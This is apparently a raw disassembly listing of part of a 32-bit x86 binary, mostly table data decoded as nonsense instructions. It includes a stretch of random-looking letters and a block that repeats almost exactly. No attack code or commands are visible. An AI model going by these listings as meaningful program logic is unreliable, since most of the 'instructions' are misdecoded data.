  4250c9:	pop    esp
  4250ca:	add    al,BYTE PTR [eax]
  4250cc:	scas   al,BYTE PTR es:[edi]
  4250cd:	pop    esp
  4250ce:	add    al,BYTE PTR [eax]
  4250d0:	ret    0x25c
  4250d3:	add    al,dl
  4250d5:	pop    esp
  4250d6:	add    al,BYTE PTR [eax]
  4250d8:	loop   0x425136
  4250da:	add    al,BYTE PTR [eax]
  4250dc:	neg    BYTE PTR [edx+eax*1+0x0]
  4250e0:	or     bl,BYTE PTR [ebp+0x2]
  4250e3:	add    BYTE PTR [ebx*2+0x5d2a0002],bl
  4250ea:	add    al,BYTE PTR [eax]
  4250ec:	cmp    al,0x5d
  4250ee:	add    al,BYTE PTR [eax]
  4250f0:	dec    edx
  4250f1:	pop    ebp
  4250f2:	add    al,BYTE PTR [eax]
  4250f4:	pop    edx
  4250f5:	pop    ebp
  4250f6:	add    al,BYTE PTR [eax]
  4250f8:	outs   dx,BYTE PTR ds:[esi]
  4250f9:	pop    ebp
  4250fa:	add    al,BYTE PTR [eax]
  4250fc:	test   BYTE PTR [ebp+0x2],bl
  4250ff:	add    BYTE PTR [esi-0x5bfffda3],dl
  425105:	pop    ebp
  425106:	add    al,BYTE PTR [eax]
  425108:	mov    ah,0x5d
  42510a:	add    al,BYTE PTR [eax]
  42510c:	ret    0x25d
  42510f:	add    al,ah
  425111:	pop    ebp
  425112:	add    al,BYTE PTR [eax]
  425114:	out    dx,al
  425115:	pop    ebp
  425116:	add    al,BYTE PTR [eax]
  425118:	cli    
  425119:	pop    ebp
  42511a:	add    al,BYTE PTR [eax]
  42511c:	or     al,0x5e
  42511e:	add    al,BYTE PTR [eax]
  425120:	sbb    bl,BYTE PTR [esi+0x2]
  425123:	add    BYTE PTR [esi],ah
  425125:	pop    esi
  425126:	add    al,BYTE PTR [eax]
  425128:	ds pop esi
  42512a:	add    al,BYTE PTR [eax]
  42512c:	dec    esi
  42512d:	pop    esi
  42512e:	add    al,BYTE PTR [eax]
  425130:	pop    edx
  425131:	pop    esi
  425132:	add    al,BYTE PTR [eax]
  425134:	push   0x5e
  425136:	add    al,BYTE PTR [eax]
  425138:	test   BYTE PTR [esi+0x2],bl
  42513b:	add    BYTE PTR [edx-0x57fffda2],bl
  425141:	pop    esi
  425142:	add    al,BYTE PTR [eax]
  425144:	mov    edx,0xd200025e
  425149:	pop    esi
  42514a:	add    al,BYTE PTR [eax]
  42514c:	loop   0x4251ac
  42514e:	add    al,BYTE PTR [eax]
  425150:	lock pop esi
  425152:	add    al,BYTE PTR [eax]
  425154:	or     bl,BYTE PTR [edi+0x2]
  425157:	add    BYTE PTR [edx],bl
  425159:	pop    edi
  42515a:	add    al,BYTE PTR [eax]
  42515c:	cs pop edi
  42515e:	add    al,BYTE PTR [eax]
  425160:	cmp    bl,BYTE PTR [edi+0x2]
  425163:	add    BYTE PTR [edx+0x5f],cl
  425166:	add    al,BYTE PTR [eax]
  425168:	pop    edx
  425169:	pop    edi
  42516a:	add    al,BYTE PTR [eax]
  42516c:	push   0x5f
  42516e:	add    al,BYTE PTR [eax]
  425170:	sbb    BYTE PTR [edi+0x2],0x0
  425174:	xchg   edx,eax
  425175:	pop    edi
  425176:	add    al,BYTE PTR [eax]
  425178:	test   al,0x5f
  42517a:	add    al,BYTE PTR [eax]
  42517c:	mov    ah,0x5f
  42517e:	add    al,BYTE PTR [eax]
  425180:	les    ebx,FWORD PTR [edi+0x2]
  425183:	add    dl,dl
  425185:	pop    edi
  425186:	add    al,BYTE PTR [eax]
  425188:	loopne 0x4251e9
  42518a:	add    al,BYTE PTR [eax]
  42518c:	repnz pop edi
  42518e:	add    al,BYTE PTR [eax]
  425190:	push   es
  425191:	pusha  
  425192:	add    al,BYTE PTR [eax]
  425194:	push   ss
  425195:	pusha  
  425196:	add    al,BYTE PTR [eax]
  425198:	sub    BYTE PTR [eax+0x2],ah
  42519b:	add    BYTE PTR [eax+eiz*2],dh
  42519e:	add    al,BYTE PTR [eax]
  4251a0:	inc    esp
  4251a1:	pusha  
  4251a2:	add    al,BYTE PTR [eax]
  4251a4:	push   esp
  4251a5:	pusha  
  4251a6:	add    al,BYTE PTR [eax]
  4251a8:	jo     0x42520a
  4251aa:	add    al,BYTE PTR [eax]
  4251ac:	test   BYTE PTR [eax+0x2],ah
  4251af:	add    BYTE PTR [edx-0x53fffda0],dl
  4251b5:	pusha  
  4251b6:	add    al,BYTE PTR [eax]
  4251b8:	mov    edx,0xce000260
  4251bd:	pusha  
  4251be:	add    al,BYTE PTR [eax]
  4251c0:	fisub  WORD PTR [eax+0x2]
  4251c3:	add    ah,ch
  4251c5:	pusha  
  4251c6:	add    al,BYTE PTR [eax]
  4251c8:	add    BYTE PTR [eax],al
  4251ca:	add    BYTE PTR [eax],al
  4251cc:	or     al,0x61
  4251ce:	add    al,BYTE PTR [eax]
  4251d0:	sbb    ah,BYTE PTR [ecx+0x2]
  4251d3:	add    BYTE PTR [ecx+eiz*2],ch
  4251d6:	add    al,BYTE PTR [eax]
  4251d8:	inc    eax
  4251d9:	popa   
  4251da:	add    al,BYTE PTR [eax]
  4251dc:	push   edx
  4251dd:	popa   
  4251de:	add    al,BYTE PTR [eax]
  4251e0:	pusha  
  4251e1:	popa   
  4251e2:	add    al,BYTE PTR [eax]
  4251e4:	js     0x425247
  4251e6:	add    al,BYTE PTR [eax]
  4251e8:	nop
  4251e9:	popa   
  4251ea:	add    al,BYTE PTR [eax]
  4251ec:	mov    al,ds:0xb0000261
  4251f1:	popa   
  4251f2:	add    al,BYTE PTR [eax]
  4251f4:	ret    0x261
  4251f7:	add    al,bl
  4251f9:	popa   
  4251fa:	add    al,BYTE PTR [eax]
  4251fc:	in     al,0x61
  4251fe:	add    al,BYTE PTR [eax]
  425200:	(bad)  
  425201:	popa   
  425202:	add    al,BYTE PTR [eax]
  425204:	sbb    ah,BYTE PTR [edx+0x2]
  425207:	add    BYTE PTR [edx+eiz*2],ah
  42520a:	add    al,BYTE PTR [eax]
  42520c:	cmp    BYTE PTR [edx+0x2],ah
  42520f:	add    BYTE PTR [esi+0x62],cl
  425212:	add    al,BYTE PTR [eax]
  425214:	pusha  
  425215:	bound  eax,QWORD PTR [edx]
  425217:	add    BYTE PTR [edx+eiz*2+0x2],dh
  42521b:	add    BYTE PTR [edx-0x6bfffd9e],al
  425221:	bound  eax,QWORD PTR [edx]
  425223:	add    BYTE PTR [eax-0x4bfffd9e],ch
  425229:	bound  eax,QWORD PTR [edx]
  42522b:	add    dl,al
  42522d:	bound  eax,QWORD PTR [edx]
  42522f:	add    dl,dl
  425231:	bound  eax,QWORD PTR [edx]
  425233:	add    dl,ah
  425235:	bound  eax,QWORD PTR [edx]
  425237:	add    al,bh
  425239:	bound  eax,QWORD PTR [edx]
  42523b:	add    BYTE PTR [esi],al
  42523d:	arpl   WORD PTR [edx],ax
  42523f:	add    BYTE PTR [esi],dl
  425241:	arpl   WORD PTR [edx],ax
  425243:	add    BYTE PTR [eax],ch
  425245:	arpl   WORD PTR [edx],ax
  425247:	add    BYTE PTR [edx],bh
  425249:	arpl   WORD PTR [edx],ax
  42524b:	add    BYTE PTR [esi+0x63],al
  42524e:	add    al,BYTE PTR [eax]
  425250:	push   edx
  425251:	arpl   WORD PTR [edx],ax
  425253:	add    BYTE PTR [ebx+eiz*2+0x2],ah
  425257:	add    BYTE PTR [ebx+eiz*2+0x639a0002],al
  42525e:	add    al,BYTE PTR [eax]
  425260:	mov    al,0x63
  425262:	add    al,BYTE PTR [eax]
  425264:	les    esp,FWORD PTR [ebx+0x2]
  425267:	add    dh,dl
  425269:	arpl   WORD PTR [edx],ax
  42526b:	add    al,ch
  42526d:	arpl   WORD PTR [edx],ax
  42526f:	add    al,bh
  425271:	arpl   WORD PTR [edx],ax
  425273:	add    BYTE PTR [eax],cl
  425275:	add    al,BYTE PTR fs:[eax]
  425278:	sbb    BYTE PTR [edx+eax*1+0x0],ah
  42527c:	sub    BYTE PTR [edx+eax*1+0x0],ah
  425280:	cmp    al,0x64
  425282:	add    al,BYTE PTR [eax]
  425284:	dec    edx
  425285:	add    al,BYTE PTR fs:[eax]
  425288:	push   0x78000264
  42528d:	add    al,BYTE PTR fs:[eax]
  425290:	test   BYTE PTR [edx+eax*1+0x0],ah
  425294:	add    BYTE PTR [eax],al
  425296:	add    BYTE PTR [eax],al
  425298:	test   al,0x64
  42529a:	add    al,BYTE PTR [eax]
  42529c:	mov    dh,0x64
  42529e:	add    al,BYTE PTR [eax]
  4252a0:	ret    0x264
  4252a3:	add    dl,cl
  4252a5:	add    al,BYTE PTR fs:[eax]
  4252a8:	aam    0x64
  4252aa:	add    al,BYTE PTR [eax]
  4252ac:	out    0x64,al
  4252ae:	add    al,BYTE PTR [eax]
  4252b0:	hlt    
  4252b1:	add    al,BYTE PTR fs:[eax]
  4252b4:	(bad)  
  4252b5:	add    al,BYTE PTR fs:[eax]
  4252b8:	or     BYTE PTR [ebp+0x2],ah
  4252bb:	add    BYTE PTR [edx],dl
  4252bd:	add    al,BYTE PTR gs:[eax]
  4252c0:	and    ah,BYTE PTR [ebp+0x2]
  4252c3:	add    BYTE PTR [eax],dh
  4252c5:	add    al,BYTE PTR gs:[eax]
  4252c8:	cmp    al,0x65
  4252ca:	add    al,BYTE PTR [eax]
  4252cc:	inc    esi
  4252cd:	add    al,BYTE PTR gs:[eax]
  4252d0:	push   esp
  4252d1:	add    al,BYTE PTR gs:[eax]
  4252d4:	pop    esp
  4252d5:	add    al,BYTE PTR gs:[eax]
  4252d8:	data16 add al,BYTE PTR gs:[eax]
  4252dc:	jo     0x425343
  4252de:	add    al,BYTE PTR [eax]
  4252e0:	jl     0x425347
  4252e2:	add    al,BYTE PTR [eax]
  4252e4:	test   BYTE PTR [ebp+0x2],ah
  4252e7:	add    BYTE PTR [edx-0x63fffd9b],dl
  4252ed:	add    al,BYTE PTR gs:[eax]
  4252f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4252f1:	add    al,BYTE PTR gs:[eax]
  4252f4:	scas   al,BYTE PTR es:[edi]
  4252f5:	add    al,BYTE PTR gs:[eax]
  4252f8:	mov    eax,0xc2000265
  4252fd:	add    al,BYTE PTR gs:[eax]
  425300:	int3   
  425301:	add    al,BYTE PTR gs:[eax]
  425304:	aam    0x65
  425306:	add    al,BYTE PTR [eax]
  425308:	call   0xf2425572
  42530d:	add    al,BYTE PTR gs:[eax]
  425310:	cld    
  425311:	add    al,BYTE PTR gs:[eax]
  425314:	push   es
  425315:	data16 add al,BYTE PTR [eax]
  425318:	push   cs
  425319:	data16 add al,BYTE PTR [eax]
  42531c:	push   ss
  42531d:	data16 add al,BYTE PTR [eax]
  425320:	and    BYTE PTR [esi+0x2],ah
  425323:	add    BYTE PTR [edx],ch
  425325:	data16 add al,BYTE PTR [eax]
  425328:	xor    al,0x66
  42532a:	add    al,BYTE PTR [eax]
  42532c:	inc    eax
  42532d:	data16 add al,BYTE PTR [eax]
  425330:	dec    esp
  425331:	data16 add al,BYTE PTR [eax]
  425334:	push   esi
  425335:	data16 add al,BYTE PTR [eax]
  425338:	pop    esi
  425339:	data16 add al,BYTE PTR [eax]
  42533c:	outs   dx,BYTE PTR ds:[esi]
  42533d:	data16 add al,BYTE PTR [eax]
  425340:	js     0x4253a8
  425342:	add    al,BYTE PTR [eax]
  425344:	and    BYTE PTR [esi+0x2],0x0
  425348:	add    BYTE PTR [eax],al
  42534a:	add    BYTE PTR [eax],al
  42534c:	call   0x266:0xaa000266
  425353:	add    al,al
  425355:	data16 add al,BYTE PTR [eax]
  425358:	aam    0x66
  42535a:	add    al,BYTE PTR [eax]
  42535c:	loopne 0x4253c4
  42535e:	add    al,BYTE PTR [eax]
  425360:	lock data16 add al,BYTE PTR [eax]
  425364:	add    al,0x67
  425366:	add    al,BYTE PTR [eax]
  425368:	sbb    ah,BYTE PTR [edi+0x2]
  42536b:	add    BYTE PTR [edx],ch
  42536d:	add    al,BYTE PTR [bx+si]
  425370:	xor    al,0x67
  425372:	add    al,BYTE PTR [eax]
  425374:	inc    esi
  425375:	add    al,BYTE PTR [bx+si]
  425378:	push   eax
  425379:	add    al,BYTE PTR [bx+si]
  42537c:	data16 add al,BYTE PTR [bx+si]
  425380:	jb     0x4253e9
  425382:	add    al,BYTE PTR [eax]
  425384:	jl     0x4253ed
  425386:	add    al,BYTE PTR [eax]
  425388:	xchg   BYTE PTR [edi+0x2],ah
  42538b:	add    BYTE PTR [eax-0x5bfffd99],bl
  425391:	add    al,BYTE PTR [bx+si]
  425394:	mov    eax,0xc8000267
  425399:	add    al,BYTE PTR [bx+si]
  42539c:	(bad)  
  42539d:	add    al,BYTE PTR [bx+si]
  4253a0:	jmp    0x267:0xf6000267
  4253a7:	add    BYTE PTR [edx],cl
  4253a9:	push   0x68140002
  4253ae:	add    al,BYTE PTR [eax]
  4253b0:	and    ch,BYTE PTR [eax+0x2]
  4253b3:	add    BYTE PTR [eax+ebp*2],ch
  4253b6:	add    al,BYTE PTR [eax]
  4253b8:	cmp    BYTE PTR [eax+0x2],ch
  4253bb:	add    BYTE PTR [eax+ebp*2+0x2],cl
  4253bf:	add    BYTE PTR [esi+0x68],dl
  4253c2:	add    al,BYTE PTR [eax]
  4253c4:	ins    BYTE PTR es:[edi],dx
  4253c5:	push   0x68780002
  4253ca:	add    al,BYTE PTR [eax]
  4253cc:	mov    BYTE PTR [eax+0x2],ch
  4253cf:	add    BYTE PTR [edx-0x57fffd98],bl
  4253d5:	push   0x68b80002
  4253da:	add    al,BYTE PTR [eax]
  4253dc:	les    ebp,FWORD PTR [eax+0x2]
  4253df:	add    al,dl
  4253e1:	push   0x68e40002
  4253e6:	add    al,BYTE PTR [eax]
  4253e8:	out    dx,al
  4253e9:	push   0x69060002
  4253ee:	add    al,BYTE PTR [eax]
  4253f0:	push   ds
  4253f1:	imul   eax,DWORD PTR [edx],0x2692a00
  4253f7:	add    BYTE PTR [edx],bh
  4253f9:	imul   eax,DWORD PTR [edx],0x0
  4253ff:	add    BYTE PTR [eax],al
  425401:	add    BYTE PTR [eax],al
  425403:	add    BYTE PTR ds:0x4d213c,ah
  425409:	add    BYTE PTR [eax],al
  42540b:	add    BYTE PTR [edx],al
  42540d:	add    BYTE PTR [eax],al
  42540f:	add    BYTE PTR [eax+0x0],cl
  425412:	add    BYTE PTR [eax],al
  425414:	xchg   edx,eax
  425415:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425416:	add    al,BYTE PTR [eax]
  425418:	xchg   edx,eax
  425419:	cwde   
  42541a:	add    al,BYTE PTR [eax]
  42541c:	add    BYTE PTR [eax],al
  42541e:	add    BYTE PTR [eax],al
  425420:	dec    esp
  425421:	ins    BYTE PTR es:[edi],dx
  425422:	pop    edx
  425423:	push   ecx
  425424:	imul   ebx,DWORD PTR [edx+0x59],0x74
  425428:	arpl   WORD PTR [ebp+0x7a],dx
  42542b:	ja     0x425474
  42542d:	jp     0x42547e
  42542f:	gs dec ebx
  425431:	dec    ebp
  425432:	je     0x4254a3
  425434:	ja     0x42549f
  425436:	popa   
  425437:	push   edi
  425438:	jno    0x42548b
  42543a:	jae    0x4254a3
  42543c:	dec    ebx
  42543d:	dec    esp
  42543e:	jae    0x4254ba
  425440:	dec    ebp
  425441:	push   ebx
  425442:	push   eax
  425443:	push   esi
  425444:	push   eax
  425445:	fs pop eax
  425447:	ins    DWORD PTR es:[edi],dx
  425448:	push   0x56637a49
  42544d:	inc    ebp
  42544e:	dec    esi
  42544f:	push   ecx
  425450:	ins    DWORD PTR es:[edi],dx
  425451:	inc    ecx
  425452:	push   0x61
  425454:	dec    edx
  425455:	data16 ins BYTE PTR es:[edi],dx
  425457:	jne    0x4254bb
  425459:	imul   ecx,DWORD PTR [edx+0x46],0x75646348
  425460:	jno    0x4254cc
  425462:	arpl   WORD PTR [edx+0x7a],sp
  425465:	dec    ebp
  425466:	dec    edi
  425467:	push   ecx
  425468:	imul   edx,DWORD PTR [ebp+edx*2+0x6f],0x4b62554b
  425470:	push   edi
  425471:	imul   eax,DWORD PTR [edi+0x7a],0x5a71646b
  425478:	imul   eax,DWORD PTR [ecx+0x41],0x54434d58
  42547f:	dec    ebx
  425480:	js     0x4254f0
  425482:	pop    edx
  425483:	popa   
  425484:	push   ebx
  425485:	jbe    0x4254e9
  425487:	dec    ecx
  425488:	jns    0x4254e2
  42548a:	ins    DWORD PTR es:[edi],dx
  42548b:	pop    ecx
  42548c:	inc    edi
  42548d:	dec    ecx
  42548e:	outs   dx,BYTE PTR ds:[esi]
  42548f:	inc    ebp
  425490:	add    BYTE PTR [eax],al
  425492:	add    BYTE PTR [eax],al
  425494:	and    eax,0x4d213c
  425499:	add    BYTE PTR [eax],al
  42549b:	add    dl,al
  42549d:	push   esp
  42549e:	add    al,BYTE PTR [eax]
  4254a0:	add    DWORD PTR [eax],eax
  4254a2:	add    BYTE PTR [eax],al
  4254a4:	add    DWORD PTR [eax],eax
  4254a6:	add    BYTE PTR [eax],al
  4254a8:	add    DWORD PTR [eax],eax
  4254aa:	add    BYTE PTR [eax],al
  4254ac:	mov    eax,0xbc000254
  4254b1:	push   esp
  4254b2:	add    al,BYTE PTR [eax]
  4254b4:	rcl    BYTE PTR [edx+eax*1+0x0],0x4e
  4254b9:	dec    esi
  4254ba:	add    DWORD PTR [eax],eax
  4254bc:	rcl    DWORD PTR [edx+eax*1+0x0],cl
  4254c0:	add    BYTE PTR [eax],al
  4254c2:	addr16 je 0x42553e
  4254c5:	ins    BYTE PTR es:[edi],dx
  4254c6:	bound  esp,QWORD PTR [edi+0x6b]
  4254c9:	popa   
  4254ca:	push   0x68
  4254cc:	jns    0x425503
  4254ce:	cs je  0x42553a
  4254d1:	jo     0x4254d3
  4254d3:	aas    
  4254d4:	inc    ecx
  4254d5:	jo     0x425547
  4254d7:	dec    esi
  4254d8:	popa   
  4254d9:	ins    DWORD PTR es:[edi],dx
  4254da:	gs inc ebp
  4254dc:	js     0x425535
  4254de:	inc    eax
  4254df:	inc    eax
  4254e0:	pop    ecx
  4254e1:	inc    edi
  4254e2:	push   eax
  4254e3:	inc    ecx
  4254e4:	inc    edi
  4254e5:	push   eax
  4254e6:	inc    ecx
  4254e7:	dec    ebp
  4254e8:	push   eax
  4254e9:	inc    ecx
  4254ea:	inc    esi
  4254eb:	push   eax
  4254ec:	inc    ecx
  4254ed:	dec    ebp
  4254ee:	dec    ecx
  4254ef:	cmp    al,0x56
	...
  4254fd:	add    BYTE PTR [eax],al
  4254ff:	add    BYTE PTR [eax+0x55],bh
  425502:	add    al,BYTE PTR [eax]
	...
  42550c:	cld    
  42550d:	pop    ecx
  42550e:	add    al,BYTE PTR [eax]
  425510:	add    BYTE PTR [eax+0x2],dl
  425513:	add    BYTE PTR [ebp+edx*2+0x2],dl
  42551a:	add    BYTE PTR [eax],al
  42551c:	add    BYTE PTR [eax],al
  42551e:	add    BYTE PTR [eax],al
  425520:	add    BYTE PTR [ecx+0x2],ah
  425523:	add    BYTE PTR [eax+edx*2],bl
  425526:	add    al,BYTE PTR [eax]
  425528:	inc    esp
  425529:	push   edi
  42552a:	add    al,BYTE PTR [eax]
	...
  425534:	call   0x251:0xcc000264
  42553b:	add    BYTE PTR [eax],dl
  42553d:	pop    eax
  42553e:	add    al,BYTE PTR [eax]
	...
  425548:	mov    fs,WORD PTR [esi+0x2]
  42554b:	add    BYTE PTR [eax-0x3bfffdae],bl
  425551:	pop    eax
  425552:	add    al,BYTE PTR [eax]
	...
  42555c:	dec    eax
  42555d:	imul   eax,DWORD PTR [edx],0x2534c00
	...
  425577:	add    BYTE PTR [eax+0x59],bh
  42557a:	add    al,BYTE PTR [eax]
  42557c:	nop
  42557d:	pop    ecx
  42557e:	add    al,BYTE PTR [eax]
  425580:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425581:	pop    ecx
  425582:	add    al,BYTE PTR [eax]
  425584:	mov    dh,0x59
  425586:	add    al,BYTE PTR [eax]
  425588:	retf   0x259
  42558b:	add    al,ah
  42558d:	pop    ecx
  42558e:	add    al,BYTE PTR [eax]
  425590:	add    BYTE PTR [eax],al
  425592:	add    BYTE PTR [eax],al
  425594:	or     bl,BYTE PTR [edx+0x2]
  425597:	add    BYTE PTR [eax],bl
  425599:	pop    edx
  42559a:	add    al,BYTE PTR [eax]
  42559c:	and    al,0x5a
  42559e:	add    al,BYTE PTR [eax]
  4255a0:	xor    bl,BYTE PTR [edx+0x2]
  4255a3:	add    BYTE PTR [esi],bh
  4255a5:	pop    edx
  4255a6:	add    al,BYTE PTR [eax]
  4255a8:	dec    esp
  4255a9:	pop    edx
  4255aa:	add    al,BYTE PTR [eax]
  4255ac:	pop    esi
  4255ad:	pop    edx
  4255ae:	add    al,BYTE PTR [eax]
  4255b0:	outs   dx,BYTE PTR ds:[esi]
  4255b1:	pop    edx
  4255b2:	add    al,BYTE PTR [eax]
  4255b4:	sbb    BYTE PTR [edx+0x2],0x0
  4255b8:	mov    WORD PTR [edx+0x2],ds
  4255bb:	add    BYTE PTR [eax-0x55fffda6],bl
  4255c1:	pop    edx
  4255c2:	add    al,BYTE PTR [eax]
  4255c4:	mov    dh,0x5a
  4255c6:	add    al,BYTE PTR [eax]
  4255c8:	retf   0x25a
  4255cb:	add    dl,bl
  4255cd:	pop    edx
  4255ce:	add    al,BYTE PTR [eax]
  4255d0:	call   0xf642582f
  4255d5:	pop    edx
  4255d6:	add    al,BYTE PTR [eax]
  4255d8:	add    bl,BYTE PTR [ebx+0x2]
  4255db:	add    BYTE PTR [eax],dl
  4255dd:	pop    ebx
  4255de:	add    al,BYTE PTR [eax]
  4255e0:	push   ds
  4255e1:	pop    ebx
  4255e2:	add    al,BYTE PTR [eax]
  4255e4:	sub    bl,BYTE PTR [ebx+0x2]
  4255e7:	add    BYTE PTR [edx],bh
  4255e9:	pop    ebx
  4255ea:	add    al,BYTE PTR [eax]
  4255ec:	dec    eax
  4255ed:	pop    ebx
  4255ee:	add    al,BYTE PTR [eax]
  4255f0:	push   esp
  4255f1:	pop    ebx
  4255f2:	add    al,BYTE PTR [eax]
  4255f4:	pusha  
  4255f5:	pop    ebx
  4255f6:	add    al,BYTE PTR [eax]
  4255f8:	jo     0x425655
  4255fa:	add    al,BYTE PTR [eax]
  4255fc:	sbb    BYTE PTR [ebx+0x2],0x0
  425600:	xchg   edx,eax
  425601:	pop    ebx
  425602:	add    al,BYTE PTR [eax]
  425604:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425605:	pop    ebx
  425606:	add    al,BYTE PTR [eax]
  425608:	mov    eax,0xc800025b
  42560d:	pop    ebx
  42560e:	add    al,BYTE PTR [eax]
  425610:	aam    0x5b
  425612:	add    al,BYTE PTR [eax]
  425614:	out    0x5b,al
  425616:	add    al,BYTE PTR [eax]
  425618:	repnz pop ebx
  42561a:	add    al,BYTE PTR [eax]
  42561c:	(bad)  
  42561d:	pop    ebx
  42561e:	add    al,BYTE PTR [eax]
  425620:	push   cs
  425621:	pop    esp
  425622:	add    al,BYTE PTR [eax]
  425624:	sbb    al,0x5c
  425626:	add    al,BYTE PTR [eax]
  425628:	cs pop esp
  42562a:	add    al,BYTE PTR [eax]
  42562c:	ds pop esp
  42562e:	add    al,BYTE PTR [eax]
  425630:	dec    esi
  425631:	pop    esp
  425632:	add    al,BYTE PTR [eax]
  425634:	pusha  
  425635:	pop    esp
  425636:	add    al,BYTE PTR [eax]
  425638:	ins    BYTE PTR es:[edi],dx
  425639:	pop    esp
  42563a:	add    al,BYTE PTR [eax]
  42563c:	xchg   BYTE PTR [edx+eax*1+0x0],bl
  425640:	xchg   esi,eax
  425641:	pop    esp
  425642:	add    al,BYTE PTR [eax]
  425644:	scas   al,BYTE PTR es:[edi]
  425645:	pop    esp
  425646:	add    al,BYTE PTR [eax]
  425648:	ret    0x25c
  42564b:	add    al,dl
  42564d:	pop    esp
  42564e:	add    al,BYTE PTR [eax]
  425650:	loop   0x4256ae
  425652:	add    al,BYTE PTR [eax]
  425654:	neg    BYTE PTR [edx+eax*1+0x0]
  425658:	or     bl,BYTE PTR [ebp+0x2]
  42565b:	add    BYTE PTR [ebx*2+0x5d2a0002],bl
  425662:	add    al,BYTE PTR [eax]
  425664:	cmp    al,0x5d
  425666:	add    al,BYTE PTR [eax]
  425668:	dec    edx
  425669:	pop    ebp
  42566a:	add    al,BYTE PTR [eax]
  42566c:	pop    edx
  42566d:	pop    ebp
  42566e:	add    al,BYTE PTR [eax]
  425670:	outs   dx,BYTE PTR ds:[esi]
  425671:	pop    ebp
  425672:	add    al,BYTE PTR [eax]
  425674:	test   BYTE PTR [ebp+0x2],bl
  425677:	add    BYTE PTR [esi-0x5bfffda3],dl
  42567d:	pop    ebp
  42567e:	add    al,BYTE PTR [eax]
  425680:	mov    ah,0x5d
  425682:	add    al,BYTE PTR [eax]
  425684:	ret    0x25d
  425687:	add    al,ah
  425689:	pop    ebp
  42568a:	add    al,BYTE PTR [eax]
  42568c:	out    dx,al
  42568d:	pop    ebp
  42568e:	add    al,BYTE PTR [eax]
  425690:	cli    
  425691:	pop    ebp
  425692:	add    al,BYTE PTR [eax]
  425694:	or     al,0x5e
  425696:	add    al,BYTE PTR [eax]
  425698:	sbb    bl,BYTE PTR [esi+0x2]
  42569b:	add    BYTE PTR [esi],ah
  42569d:	pop    esi
  42569e:	add    al,BYTE PTR [eax]
  4256a0:	ds pop esi
  4256a2:	add    al,BYTE PTR [eax]
  4256a4:	dec    esi
  4256a5:	pop    esi
  4256a6:	add    al,BYTE PTR [eax]
  4256a8:	pop    edx
  4256a9:	pop    esi
  4256aa:	add    al,BYTE PTR [eax]
  4256ac:	push   0x5e
  4256ae:	add    al,BYTE PTR [eax]
  4256b0:	test   BYTE PTR [esi+0x2],bl
  4256b3:	add    BYTE PTR [edx-0x57fffda2],bl
  4256b9:	pop    esi
  4256ba:	add    al,BYTE PTR [eax]
  4256bc:	mov    edx,0xd200025e
  4256c1:	pop    esi
  4256c2:	add    al,BYTE PTR [eax]
  4256c4:	loop   0x425724
  4256c6:	add    al,BYTE PTR [eax]
  4256c8:	lock pop esi
  4256ca:	add    al,BYTE PTR [eax]
  4256cc:	or     bl,BYTE PTR [edi+0x2]
  4256cf:	add    BYTE PTR [edx],bl
  4256d1:	pop    edi
  4256d2:	add    al,BYTE PTR [eax]
  4256d4:	cs pop edi
  4256d6:	add    al,BYTE PTR [eax]
  4256d8:	cmp    bl,BYTE PTR [edi+0x2]
  4256db:	add    BYTE PTR [edx+0x5f],cl
  4256de:	add    al,BYTE PTR [eax]
  4256e0:	pop    edx
  4256e1:	pop    edi
  4256e2:	add    al,BYTE PTR [eax]
  4256e4:	push   0x5f
  4256e6:	add    al,BYTE PTR [eax]
  4256e8:	sbb    BYTE PTR [edi+0x2],0x0
  4256ec:	xchg   edx,eax
  4256ed:	pop    edi
  4256ee:	add    al,BYTE PTR [eax]
  4256f0:	test   al,0x5f
  4256f2:	add    al,BYTE PTR [eax]
  4256f4:	mov    ah,0x5f
  4256f6:	add    al,BYTE PTR [eax]
  4256f8:	les    ebx,FWORD PTR [edi+0x2]
  4256fb:	add    dl,dl
  4256fd:	pop    edi
  4256fe:	add    al,BYTE PTR [eax]
  425700:	loopne 0x425761
  425702:	add    al,BYTE PTR [eax]
  425704:	repnz pop edi
  425706:	add    al,BYTE PTR [eax]
  425708:	push   es
  425709:	pusha  
  42570a:	add    al,BYTE PTR [eax]
  42570c:	push   ss
  42570d:	pusha  
  42570e:	add    al,BYTE PTR [eax]
  425710:	sub    BYTE PTR [eax+0x2],ah
  425713:	add    BYTE PTR [eax+eiz*2],dh
  425716:	add    al,BYTE PTR [eax]
  425718:	inc    esp
  425719:	pusha  
  42571a:	add    al,BYTE PTR [eax]
  42571c:	push   esp
  42571d:	pusha  
  42571e:	add    al,BYTE PTR [eax]
  425720:	jo     0x425782
  425722:	add    al,BYTE PTR [eax]
  425724:	test   BYTE PTR [eax+0x2],ah
  425727:	add    BYTE PTR [edx-0x53fffda0],dl
  42572d:	pusha  
  42572e:	add    al,BYTE PTR [eax]
  425730:	mov    edx,0xce000260
  425735:	pusha  
  425736:	add    al,BYTE PTR [eax]
  425738:	fisub  WORD PTR [eax+0x2]
  42573b:	add    ah,ch
  42573d:	pusha  
  42573e:	add    al,BYTE PTR [eax]
  425740:	add    BYTE PTR [eax],al
  425742:	add    BYTE PTR [eax],al
  425744:	or     al,0x61
  425746:	add    al,BYTE PTR [eax]
  425748:	sbb    ah,BYTE PTR [ecx+0x2]
  42574b:	add    BYTE PTR [ecx+eiz*2],ch
  42574e:	add    al,BYTE PTR [eax]
  425750:	inc    eax
  425751:	popa   
  425752:	add    al,BYTE PTR [eax]
  425754:	push   edx
  425755:	popa   
  425756:	add    al,BYTE PTR [eax]
  425758:	pusha  
  425759:	popa   
  42575a:	add    al,BYTE PTR [eax]
  42575c:	js     0x4257bf
  42575e:	add    al,BYTE PTR [eax]
  425760:	nop
  425761:	popa   
  425762:	add    al,BYTE PTR [eax]
  425764:	mov    al,ds:0xb0000261
  425769:	popa   
  42576a:	add    al,BYTE PTR [eax]
  42576c:	ret    0x261
  42576f:	add    al,bl
  425771:	popa   
  425772:	add    al,BYTE PTR [eax]
  425774:	in     al,0x61
  425776:	add    al,BYTE PTR [eax]
  425778:	(bad)  
  425779:	popa   
  42577a:	add    al,BYTE PTR [eax]
  42577c:	sbb    ah,BYTE PTR [edx+0x2]
  42577f:	add    BYTE PTR [edx+eiz*2],ah
  425782:	add    al,BYTE PTR [eax]
  425784:	cmp    BYTE PTR [edx+0x2],ah
  425787:	add    BYTE PTR [esi+0x62],cl
  42578a:	add    al,BYTE PTR [eax]
  42578c:	pusha  
